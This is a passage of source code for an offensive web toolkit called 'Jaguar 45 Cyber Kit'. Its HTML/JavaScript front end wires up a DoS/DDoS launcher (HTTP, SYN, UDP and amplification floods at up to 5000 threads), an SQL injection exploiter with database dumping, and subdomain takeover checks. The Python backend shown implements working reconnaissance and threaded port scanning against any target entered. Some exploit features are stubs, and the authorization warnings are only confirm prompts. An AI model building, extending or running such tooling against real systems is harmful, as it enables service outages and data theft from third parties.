                        <button class="btn" onclick="startSubdomainScan()">
                            <i class="fas fa-search"></i> Find Subdomains
                        </button>
                        <button class="btn-purple" onclick="startSubdomainTakeover()">
                            <i class="fas fa-skull-crossbones"></i> Check Takeover
                        </button>
                    </div>
                    
                    <div class="results-panel" id="subResults">
                        <!-- Results will appear here -->
                    </div>
                </div>
            `;
        }
        
        function getVulnScanTool() {
            return `
                <div class="tool-section active">
                    <div class="section-header">
                        <h2><i class="fas fa-bug"></i> WEB VULNERABILITY SCANNER</h2>
                        <p>Comprehensive web application security assessment</p>
                    </div>
                    
                    <div class="alert alert-warning">
                        <i class="fas fa-exclamation-triangle"></i> This tool performs real vulnerability tests
                    </div>
                    
                    <div class="form-grid">
                        <div class="form-group">
                            <label class="form-label">Target URL:</label>
                            <input type="text" id="vulnTarget" class="form-input" placeholder="https://example.com" value="https://example.com">
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Scan Depth:</label>
                            <select id="vulnDepth" class="form-input">
                                <option value="quick">Quick Scan</option>
                                <option value="standard" selected>Standard Scan</option>
                                <option value="deep">Deep Scan</option>
                                <option value="aggressive">Aggressive Scan</option>
                            </select>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Vulnerability Checks:</label>
                            <div style="margin-top: 10px;">
                                <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px;">
                                    <label><input type="checkbox" id="vulnSQLi" checked> SQL Injection</label>
                                    <label><input type="checkbox" id="vulnXSS" checked> Cross-Site Scripting</label>
                                    <label><input type="checkbox" id="vulnLFI" checked> LFI/RFI</label>
                                    <label><input type="checkbox" id="vulnCMDi" checked> Command Injection</label>
                                    <label><input type="checkbox" id="vulnSSRF" checked> SSRF</label>
                                    <label><input type="checkbox" id="vulnXXE" checked> XXE</label>
                                    <label><input type="checkbox" id="vulnHeaders" checked> Security Headers</label>
                                    <label><input type="checkbox" id="vulnCORS" checked> CORS Misconfig</label>
                                    <label><input type="checkbox" id="vulnJWT" checked> JWT Issues</label>
                                    <label><input type="checkbox" id="vulnSSL" checked> SSL/TLS</label>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="btn-group">
                        <button class="btn" onclick="startVulnScan()">
                            <i class="fas fa-play"></i> Start Vulnerability Scan
                        </button>
                        <button class="btn-danger" onclick="startExploitScan()">
                            <i class="fas fa-bolt"></i> Exploitation Scan
                        </button>
                        <button class="btn-danger" onclick="stopScan('vuln')">
                            <i class="fas fa-stop"></i> Stop
                        </button>
                    </div>
                    
                    <div class="results-panel" id="vulnResults">
                        <!-- Results will appear here -->
                    </div>
                </div>
            `;
        }
        
        function getSQLiTool() {
            return `
                <div class="tool-section active">
                    <div class="section-header">
                        <h2><i class="fas fa-database"></i> SQL INJECTION EXPLOITER</h2>
                        <p>Advanced SQL injection testing and exploitation</p>
                    </div>
                    
                    <div class="alert alert-danger">
                        <i class="fas fa-skull-crossbones"></i> REAL SQL injection attacks - Authorized use only!
                    </div>
                    
                    <div class="form-grid">
                        <div class="form-group">
                            <label class="form-label">Target URL:</label>
                            <input type="text" id="sqliTarget" class="form-input" placeholder="http://example.com/page.php?id=1" value="http://testphp.vulnweb.com/artists.php?artist=1">
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Injection Type:</label>
                            <select id="sqliType" class="form-input">
                                <option value="error">Error-Based</option>
                                <option value="boolean">Boolean-Based</option>
                                <option value="time">Time-Based</option>
                                <option value="union">Union-Based</option>
                                <option value="stacked">Stacked Queries</option>
                            </select>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Database Type:</label>
                            <select id="sqliDB" class="form-input">
                                <option value="auto">Auto-Detect</option>
                                <option value="mysql">MySQL</option>
                                <option value="mssql">Microsoft SQL</option>
                                <option value="oracle">Oracle</option>
                                <option value="postgres">PostgreSQL</option>
                                <option value="sqlite">SQLite</option>
                            </select>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Exploitation Level:</label>
                            <select id="sqliLevel" class="form-input">
                                <option value="detection">Detection Only</option>
                                <option value="enumeration">Enumeration</option>
                                <option value="extraction">Data Extraction</option>
                                <option value="full">Full Exploitation</option>
                            </select>
                        </div>
                    </div>
                    
                    <div class="btn-group">
                        <button class="btn-warning" onclick="startSQLiScan()">
                            <i class="fas fa-search"></i> Detect SQLi
                        </button>
                        <button class="btn-danger" onclick="startSQLiExploit()">
                            <i class="fas fa-bolt"></i> Exploit SQLi
                        </button>
                        <button class="btn-purple" onclick="dumpDatabase()">
                            <i class="fas fa-download"></i> Dump Database
                        </button>
                    </div>
                    
                    <div class="console-output" id="sqliConsole" style="height: 400px;">
                        <!-- Console output will appear here -->
                    </div>
                </div>
            `;
        }
        
        function getDOSTool() {
            return `
                <div class="tool-section active">
                    <div class="section-header">
                        <h2><i class="fas fa-bomb"></i> ADVANCED DoS/DDoS ATTACK</h2>
                        <p>Multiple DoS attack vectors with high performance</p>
                    </div>
                    
                    <div class="alert alert-danger">
                        <i class="fas fa-radiation"></i> EXTREME DANGER: Real DoS attacks - ILLEGAL without authorization!
                    </div>
                    
                    <div class="form-grid">
                        <div class="form-group">
                            <label class="form-label">Target URL/IP:</label>
                            <input type="text" id="dosTarget" class="form-input" placeholder="http://example.com or 192.168.1.1">
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Attack Type:</label>
                            <select id="dosType" class="form-input">
                                <option value="http">HTTP Flood</option>
                                <option value="slowloris">Slowloris</option>
                                <option value="syn">SYN Flood</option>
                                <option value="udp">UDP Flood</option>
                                <option value="icmp">ICMP Flood</option>
                                <option value="amplification">Amplification Attack</option>
                                <option value="mixed">Mixed Attack</option>
                            </select>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Attack Power:</label>
                            <select id="dosPower" class="form-input">
                                <option value="low">Low (100 threads)</option>
                                <option value="medium" selected>Medium (500 threads)</option>
                                <option value="high">High (1000 threads)</option>
                                <option value="extreme">Extreme (5000 threads)</option>
                            </select>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Duration (seconds):</label>
                            <input type="number" id="dosDuration" class="form-input" value="60" min="1" max="3600">
                        </div>
                    </div>
                    
                    <div class="btn-group">
                        <button class="btn-danger" onclick="confirmDoS()">
                            <i class="fas fa-play"></i> Launch DoS Attack
                        </button>
                        <button class="btn" onclick="testConnection()">
                            <i class="fas fa-wifi"></i> Test Connection
                        </button>
                        <button class="btn" onclick="stopAttack()">
                            <i class="fas fa-stop"></i> Stop Attack
                        </button>
                    </div>
                    
                    <div class="console-output" id="dosConsole" style="height: 300px; color: #ff0055;">
                        <!-- Attack logs will appear here -->
                    </div>
                    
                    <div class="progress-container">
                        <div class="form-label">Attack Progress</div>
                        <div class="progress-bar">
                            <div class="progress-fill" id="dosProgress" style="width: 0%; background: linear-gradient(90deg, #ff0055, #ff5500);"></div>
                        </div>
                    </div>
                </div>
            `;
        }
        
        // Add other tool template functions here...
        // For brevity, I'm showing key tools. You can expand with similar templates for all tools
        
        // Initialize with recon tool
        loadToolContent('recon');
        
        // API Functions
        function logActivity(message, type = 'info') {
            const now = new Date();
            const timestamp = `[${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}]`;
            const log = `${timestamp} ${message}`;
            
            activityLog.push({message: log, type});
            if(activityLog.length > 50) activityLog.shift();
            
            const logElement = document.getElementById('activityLog');
            let color = '#00ff88';
            if(type === 'error') color = '#ff0055';
            if(type === 'warning') color = '#ffff00';
            if(type === 'success') color = '#00ff88';
            if(type === 'info') color = '#00ffff';
            
            logElement.innerHTML += `<span style="color: ${color}">${log}</span>\n`;
            logElement.scrollTop = logElement.scrollHeight;
            
            // Update stats
            if(type === 'success') stats.success++;
            updateStats();
        }
        
        function updateStats() {
            document.getElementById('statScans').textContent = Object.keys(activeScans).length;
            document.getElementById('statVulns').textContent = stats.vulns;
            document.getElementById('statSuccess').textContent = `${Math.min(100, Math.floor((stats.success / (stats.success + 10)) * 100))}%`;
        }
        
        function showLoading(elementId, message = 'Processing...') {
            document.getElementById(elementId).innerHTML = `
                <div class="loading">
                    <div class="spinner"></div>
                    ${message}
                </div>
            `;
        }
        
        function showResults(elementId, content) {
            document.getElementById(elementId).innerHTML = content;
        }
        
        // Tool execution functions
        async function startRecon() {
            const target = document.getElementById('reconTarget').value;
            if(!target) {
                alert('Please enter a target');
                return;
            }
            
            showLoading('reconResults', 'Starting reconnaissance...');
            logActivity(`Starting reconnaissance on ${target}`, 'info');
            
            try {
                const response = await fetch('/api/recon', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        target: target,
                        dns: document.getElementById('reconDNS').checked,
                        ports: document.getElementById('reconPorts').checked,
                        whois: document.getElementById('reconWHOIS').checked,
                        tech: document.getElementById('reconTech').checked
                    })
                });
                
                const data = await response.json();
                
                if(data.error) {
                    showResults('reconResults', `<div class="result-item error">Error: ${data.error}</div>`);
                    logActivity(`Recon failed: ${data.error}`, 'error');
                    return;
                }
                
                let resultsHTML = '<div class="result-item success"><strong>RECONNAISSANCE RESULTS</strong></div>';
                
                // Display results in a structured way
                if(data.ip) resultsHTML += `<div class="result-item info"><strong>IP Address:</strong> ${data.ip}</div>`;
                if(data.hostname) resultsHTML += `<div class="result-item info"><strong>Hostname:</strong> ${data.hostname}</div>`;
                
                if(data.ports && data.ports.length > 0) {
                    resultsHTML += '<div class="result-item info"><strong>Open Ports:</strong></div>';
                    resultsHTML += '<div class="port-grid">';
                    data.ports.forEach(port => {
                        resultsHTML += `<div class="port-item open">${port.port}/${port.protocol}<br><small>${port.service}</small></div>`;
                    });
                    resultsHTML += '</div>';
                    stats.ports += data.ports.length;
                }
                
                if(data.dns && data.dns.length > 0) {
                    resultsHTML += '<div class="result-item info"><strong>DNS Records:</strong></div>';
                    data.dns.forEach(record => {
                        resultsHTML += `<div class="result-item">${record}</div>`;
                    });
                }
                
                if(data.technologies && data.technologies.length > 0) {
                    resultsHTML += '<div class="result-item info"><strong>Technologies Detected:</strong></div>';
                    data.technologies.forEach(tech => {
                        resultsHTML += `<div class="result-item">${tech}</div>`;
                    });
                }
                
                if(data.subdomains && data.subdomains.length > 0) {
                    resultsHTML += '<div class="result-item info"><strong>Subdomains Found:</strong> ' + data.subdomains.length + '</div>';
                    data.subdomains.forEach(sub => {
                        resultsHTML += `<div class="result-item success">${sub}</div>`;
                    });
                }
                
                showResults('reconResults', resultsHTML);
                logActivity(`Reconnaissance completed successfully`, 'success');
                
            } catch(error) {
                showResults('reconResults', `<div class="result-item error">Network error: ${error.message}</div>`);
                logActivity(`Recon failed: ${error.message}`, 'error');
            }
        }
        
        async function startPortScan() {
            const target = document.getElementById('portTarget').value;
            const type = document.getElementById('portType').value;
            const customPorts = document.getElementById('customPorts').value;
            const threads = document.getElementById('portThreads').value;
            
            if(!target) {
                alert('Please enter a target');
                return;
            }
            
            showLoading('portResults', 'Starting port scan...');
            logActivity(`Starting ${type} port scan on ${target}`, 'info');
            
            // Start progress animation
            let progress = 0;
            const progressInterval = setInterval(() => {
                progress = Math.min(90, progress + 5);
                document.getElementById('portProgress').style.width = progress + '%';
            }, 500);
            
            try {
                const response = await fetch('/api/portscan', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        target: target,
                        type: type,
                        customPorts: customPorts,
                        threads: parseInt(threads)
                    })
                });
                
                clearInterval(progressInterval);
                document.getElementById('portProgress').style.width = '100%';
                
                const data = await response.json();
                
                if(data.error) {
                    showResults('portResults', `<div class="result-item error">Error: ${data.error}</div>`);
                    logActivity(`Port scan failed: ${data.error}`, 'error');
                    return;
                }
                
                let resultsHTML = `
                    <div class="result-item success">
                        <strong>PORT SCAN RESULTS</strong><br>
                        Target: ${data.target}<br>
                        IP: ${data.ip}<br>
                        Scan Time: ${data.scan_time}s<br>
                        Open Ports: ${data.open_ports.length}
                    </div>
                `;
                
                if(data.open_ports && data.open_ports.length > 0) {
                    resultsHTML += '<div class="port-grid">';
                    data.open_ports.forEach(port => {
                        const banner = port.banner ? `<br><small>${port.banner.substring(0, 50)}...</small>` : '';
                        resultsHTML += `
                            <div class="port-item open">
                                ${port.port}/${port.protocol}<br>
                                <small>${port.service}</small>
                                ${banner}
                            </div>
                        `;
                    });
                    resultsHTML += '</div>';
                    stats.ports += data.open_ports.length;
                } else {
                    resultsHTML += '<div class="result-item warning">No open ports found</div>';
                }
                
                showResults('portResults', resultsHTML);
                logActivity(`Port scan completed: ${data.open_ports.length} open ports found`, 'success');
                
            } catch(error) {
                clearInterval(progressInterval);
                showResults('portResults', `<div class="result-item error">Network error: ${error.message}</div>`);
                logActivity(`Port scan failed: ${error.message}`, 'error');
            }
        }
        
        async function startSubdomainScan() {
            const domain = document.getElementById('subDomain').value;
            const method = document.getElementById('subMethod').value;
            const wordlist = document.getElementById('subWordlist').value;
            
            if(!domain) {
                alert('Please enter a domain');
                return;
            }
            
            showLoading('subResults', `Finding subdomains using ${method}...`);
            logActivity(`Starting subdomain enumeration on ${domain}`, 'info');
            
            try {
                const response = await fetch('/api/subdomain', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        domain: domain,
                        method: method,
                        wordlist: wordlist
                    })
                });
                
                const data = await response.json();
                
                if(data.error) {
                    showResults('subResults', `<div class="result-item error">Error: ${data.error}</div>`);
                    logActivity(`Subdomain scan failed: ${data.error}`, 'error');
                    return;
                }
                
                let resultsHTML = `
                    <div class="result-item success">
                        <strong>SUBDOMAIN ENUMERATION RESULTS</strong><br>
                        Domain: ${data.domain}<br>
                        Method: ${data.method}<br>
                        Found: ${data.subdomains.length} subdomains
                    </div>
                `;
                
                if(data.subdomains && data.subdomains.length > 0) {
                    resultsHTML += '<div style="max-height: 300px; overflow-y: auto;">';
                    data.subdomains.forEach(sub => {
                        resultsHTML += `<div class="result-item success">${sub}</div>`;
                    });
                    resultsHTML += '</div>';
                } else {
                    resultsHTML += '<div class="result-item warning">No subdomains found</div>';
                }
                
                showResults('subResults', resultsHTML);
                logActivity(`Found ${data.subdomains.length} subdomains`, 'success');
                
            } catch(error) {
                showResults('subResults', `<div class="result-item error">Network error: ${error.message}</div>`);
                logActivity(`Subdomain scan failed: ${error.message}`, 'error');
            }
        }
        
        async function startVulnScan() {
            const target = document.getElementById('vulnTarget').value;
            const depth = document.getElementById('vulnDepth').value;
            
            if(!target) {
                alert('Please enter a target URL');
                return;
            }
            
            showLoading('vulnResults', 'Starting vulnerability scan...');
            logActivity(`Starting vulnerability scan on ${target}`, 'warning');
            
            // Collect checked vulnerabilities
            const checks = {
                sqli: document.getElementById('vulnSQLi').checked,
                xss: document.getElementById('vulnXSS').checked,
                lfi: document.getElementById('vulnLFI').checked,
                cmdi: document.getElementById('vulnCMDi').checked,
                ssrf: document.getElementById('vulnSSRF').checked,
                xxe: document.getElementById('vulnXXE').checked,
                headers: document.getElementById('vulnHeaders').checked,
                cors: document.getElementById('vulnCORS').checked,
                jwt: document.getElementById('vulnJWT').checked,
                ssl: document.getElementById('vulnSSL').checked
            };
            
            try {
                const response = await fetch('/api/vulnscan', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        target: target,
                        depth: depth,
                        checks: checks
                    })
                });
                
                const data = await response.json();
                
                if(data.error) {
                    showResults('vulnResults', `<div class="result-item error">Error: ${data.error}</div>`);
                    logActivity(`Vuln scan failed: ${data.error}`, 'error');
                    return;
                }
                
                let resultsHTML = `
                    <div class="result-item ${data.vulnerabilities.length > 0 ? 'error' : 'success'}">
                        <strong>VULNERABILITY SCAN RESULTS</strong><br>
                        Target: ${data.target}<br>
                        Vulnerabilities Found: ${data.vulnerabilities.length}<br>
                        Scan Time: ${data.scan_time}s
                    </div>
                `;
                
                if(data.vulnerabilities && data.vulnerabilities.length > 0) {
                    resultsHTML += '<div class="vulnerability-list">';
                    data.vulnerabilities.forEach(vuln => {
                        resultsHTML += `
                            <div class="vuln-item">
                                <div class="vuln-title">
                                    <span class="severity ${vuln.severity}">${vuln.severity}</span>
                                    ${vuln.title}
                                </div>
                                <div style="font-size: 0.9rem; margin-top: 5px;">${vuln.description}</div>
                                ${vuln.payload ? `<div class="code-block">${vuln.payload}</div>` : ''}
                                ${vuln.remediation ? `<div style="margin-top: 5px;"><strong>Remediation:</strong> ${vuln.remediation}</div>` : ''}
                            </div>
                        `;
                    });
                    resultsHTML += '</div>';
                    stats.vulns += data.vulnerabilities.length;
                    logActivity(`Found ${data.vulnerabilities.length} vulnerabilities`, 'error');
                } else {
                    resultsHTML += '<div class="result-item success">No vulnerabilities found</div>';
                    logActivity(`No vulnerabilities found`, 'success');
                }
                
                showResults('vulnResults', resultsHTML);
                
            } catch(error) {
                showResults('vulnResults', `<div class="result-item error">Network error: ${error.message}</div>`);
                logActivity(`Vuln scan failed: ${error.message}`, 'error');
            }
        }
        
        async function startSQLiScan() {
            const target = document.getElementById('sqliTarget').value;
            const type = document.getElementById('sqliType').value;
            const db = document.getElementById('sqliDB').value;
            const level = document.getElementById('sqliLevel').value;
            
            if(!target) {
                alert('Please enter a target URL');
                return;
            }
            
            const console = document.getElementById('sqliConsole');
            console.innerHTML = '';
            addConsole('sqliConsole', `[INFO] Starting SQL injection test on ${target}`, 'info');
            addConsole('sqliConsole', `[INFO] Type: ${type}, DB: ${db}, Level: ${level}`, 'info');
            
            try {
                const response = await fetch('/api/sqli', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        target: target,
                        type: type,
                        db: db,
                        level: level
                    })
                });
                
                const data = await response.json();
                
                if(data.error) {
                    addConsole('sqliConsole', `[ERROR] ${data.error}`, 'error');
                    return;
                }
                
                if(data.vulnerable) {
                    addConsole('sqliConsole', `[CRITICAL] SQL Injection vulnerability detected!`, 'error');
                    addConsole('sqliConsole', `[PAYLOAD] ${data.payload}`, 'warning');
                    
                    if(data.database) {
                        addConsole('sqliConsole', `[DATABASE] ${data.database}`, 'info');
                    }
                    
                    if(data.tables && data.tables.length > 0) {
                        addConsole('sqliConsole', `[TABLES] Found ${data.tables.length} tables:`, 'info');
                        data.tables.forEach(table => {
                            addConsole('sqliConsole', `  - ${table}`, 'info');
                        });
                    }
                    
                    if(data.data && Object.keys(data.data).length > 0) {
                        addConsole('sqliConsole', `[DATA] Extracted data:`, 'warning');
                        for(const [table, rows] of Object.entries(data.data)) {
                            addConsole('sqliConsole', `  Table: ${table}`, 'warning');
                            rows.slice(0, 3).forEach(row => {
                                addConsole('sqliConsole', `    ${JSON.stringify(row)}`, 'warning');
                            });
                        }
                    }
                    
                    stats.vulns++;
                    logActivity(`SQL Injection found on ${target}`, 'error');
                } else {
                    addConsole('sqliConsole', `[SAFE] No SQL injection vulnerability detected`, 'success');
                }
                
            } catch(error) {
                addConsole('sqliConsole', `[ERROR] ${error.message}`, 'error');
                logActivity(`SQLi test failed: ${error.message}`, 'error');
            }
        }
        
        function confirmDoS() {
            const target = document.getElementById('dosTarget').value;
            const type = document.getElementById('dosType').value;
            const power = document.getElementById('dosPower').value;
            const duration = document.getElementById('dosDuration').value;
            
            if(!target) {
                alert('Please enter a target');
                return;
            }
            
            if(!confirm(`☠️ EXTREME WARNING: This will launch REAL DoS attacks!\n\nTarget: ${target}\nType: ${type}\nPower: ${power}\nDuration: ${duration}s\n\nAre you AUTHORIZED to attack this target?`)) {
                return;
            }
            
            startDoS();
        }
        
        async function startDoS() {
            const target = document.getElementById('dosTarget').value;
            const type = document.getElementById('dosType').value;
            const power = document.getElementById('dosPower').value;
            const duration = document.getElementById('dosDuration').value;
            
            const console = document.getElementById('dosConsole');
            console.innerHTML = '';
            
            addConsole('dosConsole', `[LAUNCH] Starting ${type} DoS attack on ${target}`, 'error');
            addConsole('dosConsole', `[POWER] ${power} level, Duration: ${duration}s`, 'warning');
            
            // Start progress animation
            let elapsed = 0;
            const total = parseInt(duration);
            const progressInterval = setInterval(() => {
                elapsed++;
                const percent = Math.min(100, (elapsed / total) * 100);
                document.getElementById('dosProgress').style.width = percent + '%';
                
                if(elapsed >= total) {
                    clearInterval(progressInterval);
                    addConsole('dosConsole', `[COMPLETE] Attack finished after ${duration}s`, 'info');
                }
            }, 1000);
            
            try {
                const response = await fetch('/api/dos', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        target: target,
                        type: type,
                        power: power,
                        duration: parseInt(duration)
                    })
                });
                
                const data = await response.json();
                
                if(data.error) {
                    clearInterval(progressInterval);
                    addConsole('dosConsole', `[ERROR] ${data.error}`, 'error');
                    return;
                }
                
                addConsole('dosConsole', `[ATTACK] Attack started with ID: ${data.attack_id}`, 'warning');
                logActivity(`DoS attack launched on ${target}`, 'error');
                
                // Monitor attack
                const attackId = data.attack_id;
                const monitorInterval = setInterval(async () => {
                    try {
                        const statusResponse = await fetch(`/api/attack-status/${attackId}`);
                        const status = await statusResponse.json();
                        
                        if(status.status === 'completed' || status.status === 'stopped') {
                            clearInterval(monitorInterval);
                            clearInterval(progressInterval);
                            addConsole('dosConsole', `[FINISHED] Attack ${status.status}. Requests: ${status.requests}`, 'info');
                            document.getElementById('dosProgress').style.width = '100%';
                        } else {
                            addConsole('dosConsole', `[STATUS] Requests: ${status.requests || 0}`, 'info');
                        }
                    } catch(e) {
                        // Ignore monitoring errors
                    }
                }, 2000);
                
            } catch(error) {
                clearInterval(progressInterval);
                addConsole('dosConsole', `[ERROR] ${error.message}`, 'error');
                logActivity(`DoS attack failed: ${error.message}`, 'error');
            }
        }
        
        function addConsole(elementId, message, type = 'info') {
            const element = document.getElementById(elementId);
            let color = '#00ff88';
            if(type === 'error') color = '#ff0055';
            if(type === 'warning') color = '#ffff00';
            if(type === 'success') color = '#00ff88';
            if(type === 'info') color = '#00ffff';
            
            element.innerHTML += `<span style="color: ${color}">${message}</span>\n`;
            element.scrollTop = element.scrollHeight;
        }
        
        function stopScan(type) {
            fetch(`/api/stop/${type}`, {method: 'POST'});
            logActivity(`Stopped ${type} scan`, 'warning');
        }
        
        function stopAttack() {
            fetch('/api/stop/dos', {method: 'POST'});
            addConsole('dosConsole', '[STOPPED] Attack stopped by user', 'warning');
            logActivity('DoS attack stopped', 'warning');
        }
        
        function stopAll() {
            fetch('/api/stop/all', {method: 'POST'});
            logActivity('All operations stopped', 'warning');
            alert('All operations have been stopped');
        }
        
        function clearLogs() {
            document.getElementById('activityLog').innerHTML = '';
            activityLog = [];
            logActivity('Logs cleared', 'info');
        }
        
        function startFullRecon() {
            // Implementation for full recon
            logActivity('Full reconnaissance scan started', 'info');
            alert('Full reconnaissance feature coming soon');
        }
        
        function startStealthScan() {
            // Implementation for stealth scan
            logActivity('Stealth port scan started', 'info');
            alert('Stealth scan feature coming soon');
        }
        
        function startSubdomainTakeover() {
            // Implementation for subdomain takeover check
            logActivity('Subdomain takeover check started', 'info');
            alert('Subdomain takeover check coming soon');
        }
        
        function startExploitScan() {
            // Implementation for exploitation scan
            logActivity('Exploitation scan started', 'warning');
            alert('Exploitation scan feature coming soon');
        }
        
        function startSQLiExploit() {
            // Implementation for SQLi exploitation
            logActivity('SQL injection exploitation started', 'error');
            alert('SQL injection exploitation feature coming soon');
        }
        
        function dumpDatabase() {
            // Implementation for database dumping
            logActivity('Database dump started', 'error');
            alert('Database dump feature coming soon');
        }
        
        function testConnection() {
            // Implementation for connection test
            logActivity('Connection test started', 'info');
            alert('Connection test feature coming soon');
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            logActivity('Jaguar 45 Cyber Kit initialized', 'success');
            updateStats();
            
            // Update system load periodically
            setInterval(() => {
                const load = 30 + Math.random() * 40;
                document.getElementById('systemLoad').style.width = load + '%';
            }, 2000);
            
            // Update attack monitor
            setInterval(async () => {
                try {
                    const response = await fetch('/api/stats');
                    const data = await response.json();
                    if(data.active_attacks > 0) {
                        document.getElementById('attackStatus').innerHTML = `
                            <span style="color: #ff0055">${data.active_attacks} active attacks</span>
                        `;
                    }
                } catch(e) {
                    // Ignore
                }
            }, 3000);
        });
    </script>
</body>
</html>
'''

# JAGUAR 45 CYBER KIT - Ultimate Security Toolkit
class Jaguar45CyberKit:
    def __init__(self):
        self.active_scans = {}
        self.active_attacks = {}
        self.scan_counter = 0
        self.attack_counter = 0
        self.stats = {
            'total_scans': 0,
            'vulnerabilities_found': 0,
            'ports_found': 0,
            'successful_attacks': 0
        }
        
    def generate_id(self, prefix):
        self.scan_counter += 1
        return f"{prefix}_{self.scan_counter}_{int(time.time())}"
    
    def safe_json(self, data):
        """Convert data to JSON-safe format"""
        def serialize(obj):
            if isinstance(obj, (str, int, float, bool, type(None))):
                return obj
            elif isinstance(obj, dict):
                return {k: serialize(v) for k, v in obj.items()}
            elif isinstance(obj, list):
                return [serialize(item) for item in obj]
            elif isinstance(obj, tuple):
                return [serialize(item) for item in obj]
            elif isinstance(obj, set):
                return [serialize(item) for item in obj]
            elif hasattr(obj, '__dict__'):
                return serialize(obj.__dict__)
            else:
                return str(obj)
        
        return serialize(data)
    
    # ==================== RECONNAISSANCE ====================
    
    def reconnaissance(self, target, options):
        """Comprehensive reconnaissance"""
        scan_id = self.generate_id('recon')
        self.active_scans[scan_id] = {
            'type': 'recon',
            'target': target,
            'start': time.time(),
            'status': 'running'
        }
        
        try:
            results = {}
            start_time = time.time()
            
            # Get IP address
            try:
                ip = socket.gethostbyname(target)
                results['ip'] = ip
            except:
                results['ip'] = 'Unknown'
            
            # Get reverse DNS
            try:
                hostname = socket.gethostbyaddr(results['ip'])[0]
                results['hostname'] = hostname
            except:
                results['hostname'] = target
            
            # DNS enumeration
            if options.get('dns', True):
                try:
                    dns_results = []
                    resolver = dns.resolver.Resolver()
                    resolver.timeout = 2
                    resolver.lifetime = 2
                    
                    # A records
                    try:
                        answers = resolver.resolve(target, 'A')
                        for rdata in answers:
                            dns_results.append(f"A: {rdata}")
                    except:
                        pass
                    
                    # AAAA records
                    try:
                        answers = resolver.resolve(target, 'AAAA')
                        for rdata in answers:
                            dns_results.append(f"AAAA: {rdata}")
                    except:
                        pass
                    
                    # MX records
                    try:
                        answers = resolver.resolve(target, 'MX')
                        for rdata in answers:
                            dns_results.append(f"MX: {rdata}")
                    except:
                        pass
                    
                    # NS records
                    try:
                        answers = resolver.resolve(target, 'NS')
                        for rdata in answers:
                            dns_results.append(f"NS: {rdata}")
                    except:
                        pass
                    
                    # TXT records
                    try:
                        answers = resolver.resolve(target, 'TXT')
                        for rdata in answers:
                            dns_results.append(f"TXT: {rdata}")
                    except:
                        pass
                    
                    results['dns'] = dns_results
                except Exception as e:
                    results['dns_error'] = str(e)
            
            # Port scanning
            if options.get('ports', True):
                try:
                    open_ports = self.quick_port_scan(results.get('ip', target))
                    results['ports'] = open_ports
                    self.stats['ports_found'] += len(open_ports)
                except Exception as e:
                    results['port_scan_error'] = str(e)
            
            # WHOIS lookup
            if options.get('whois', True):
                try:
                    w = whois.whois(target)
                    whois_info = {}
                    
                    if w.domain_name:
                        whois_info['domain'] = w.domain_name
                    if w.registrar:
                        whois_info['registrar'] = w.registrar
                    if w.creation_date:
                        whois_info['creation'] = str(w.creation_date)
                    if w.expiration_date:
                        whois_info['expiration'] = str(w.expiration_date)
                    if w.name_servers:
                        whois_info['name_servers'] = list(w.name_servers)[:5]
                    
                    results['whois'] = whois_info
                except Exception as e:
                    results['whois_error'] = str(e)
            
            # Technology detection
            if options.get('tech', True):
                try:
                    technologies = []
                    
                    # Check common services
                    for proto in ['https://', 'http://']:
                        try:
                            url = proto + target
                            response = requests.get(url, timeout=5, verify=False)
                            
                            # Server header
                            server = response.headers.get('Server', '')
                            if server:
                                technologies.append(f"Server: {server}")
                            
                            # Powered by
                            powered = response.headers.get('X-Powered-By', '')
                            if powered:
                                technologies.append(f"Powered By: {powered}")
                            
                            # Framework detection
                            if 'wordpress' in response.text.lower():
                                technologies.append("WordPress")
                            if 'drupal' in response.text.lower():
                                technologies.append("Drupal")
                            if 'joomla' in response.text.lower():
                                technologies.append("Joomla")
                            if 'laravel' in response.text.lower():
                                technologies.append("Laravel")
                            if 'django' in response.text.lower():
                                technologies.append("Django")
                            if 'react' in response.text.lower():
                                technologies.append("React")
                            if 'vue' in response.text.lower():
                                technologies.append("Vue.js")
                            if 'angular' in response.text.lower():
                                technologies.append("Angular")
                            
                            break
                        except:
                            continue
                    
                    results['technologies'] = technologies
                except Exception as e:
                    results['tech_error'] = str(e)
            
            # Subdomain enumeration
            try:
                subdomains = self.find_subdomains(target, method='quick')
                results['subdomains'] = subdomains[:50]  # Limit for performance
            except Exception as e:
                results['subdomain_error'] = str(e)
            
            results['scan_time'] = round(time.time() - start_time, 2)
            results['status'] = 'completed'
            
            del self.active_scans[scan_id]
            self.stats['total_scans'] += 1
            
            return results
            
        except Exception as e:
            if scan_id in self.active_scans:
                del self.active_scans[scan_id]
            return {'error': str(e), 'status': 'failed'}
    
    def quick_port_scan(self, target, ports=None):
        """Quick port scan"""
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 
                    3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017, 9200]
        
        open_ports = []
        
        def check_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                sock.close()
                
                if result == 0:
                    service = self.get_service_name(port)
                    open_ports.append({
                        'port': port,
                        'protocol': 'tcp',
                        'service': service,
                        'status': 'open'
                    })
            except:
                pass
        
        # Use threading for speed
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(check_port, ports)
        
        return sorted(open_ports, key=lambda x: x['port'])
    
